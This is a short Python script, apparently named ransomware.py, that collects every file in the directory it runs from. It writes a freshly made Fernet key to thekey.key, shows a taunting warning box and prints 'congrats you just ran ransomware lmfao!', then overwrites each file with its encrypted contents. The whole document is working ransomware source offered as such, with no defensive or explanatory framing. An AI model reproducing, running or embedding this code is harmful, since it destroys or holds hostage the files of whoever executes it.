import os
from cryptography.fernet import Fernet
from colorama import Fore
from tkinter import *
from tkinter import messagebox

files = []

os.system("title zt")

for file in os.listdir():
    if file == "ransomware.py" or file == "thekey.key" or file == "decrypt.py": # don't worry thekey.key will automatically be created when ransomware.py is ran!
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)
print("congrats you just ran ransomware lmfao!")

window = Tk()
window.eval('tk::PlaceWindow %s center' % window.winfo_toplevel())

messagebox.showinfo('Warning', 'Dont run this file again or your directory will be perma encrypted read decrypt.py for help')

window.deiconify()
window.destroy()
window.quit()

key = Fernet.generate_key()


with open("thekey.key", "wb") as thekey:
        thekey.write(key)



for file in files:
     with open(file, "rb") as thefile:
        contents = thefile.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_encrypted)
           
